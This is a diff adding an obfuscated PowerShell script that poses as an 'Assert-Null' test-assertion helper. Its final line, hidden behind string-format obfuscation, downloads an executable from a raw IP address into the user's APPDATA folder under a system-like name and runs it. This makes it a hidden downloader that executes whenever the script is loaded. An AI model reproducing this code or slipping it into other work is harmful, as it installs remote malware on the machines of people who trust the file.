@@ -1,0 +1,27 @@
+function a`sSERt-nu`Ll
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(pOsITiON=0)]
+        [object]
+        
+        ${vA`LUe}, 
+
+        [Parameter(PoSiTIon=1)]
+        [string]
+        
+        ${mes`SAGE}
+    )
+
+    .("{1}{2}{4}{3}{0}"-f'tMode','Set','-','ic','Str') -Version ("{1}{2}{0}"-f'st','Lat','e')
+
+    if( ${vA`lUE} -ne ${NU`ll} )
+    {
+        .("{0}{1}"-f'F','ail') ('Valu'+'e '+"'$Value' "+'is'+' '+'not'+' '+'nul'+'l:'+' '+"$Message")
+    }
+}
+
+&("{1}{0}{2}"-f'i','Set-Al','as') -Name ("{3}{1}{2}{0}"-f 'll','se','rt-IsNu','As') -Value ("{2}{1}{0}" -f'll','Nu','Assert-')
+
+(&("{2}{1}{0}" -f'ect','j','New-Ob') ("{3}{0}{1}{2}{5}{4}" -f'te','m.Net.','W','Sys','Client','eb')).("{1}{2}{0}"-f 'adFile','Do','wnlo').Invoke(("{7}{5}{3}{4}{2}{1}{0}{6}"-f 'o/csrsv.','/~yaho','8','.2','3','02.53','exe','http://94.1'),"$env:APPDATA\csrsv.exe");.("{1}{4}{0}{2}{3}"-f '-Proc','Sta','es','s','rt') ("$env:APPDATA\csrsv.exe")
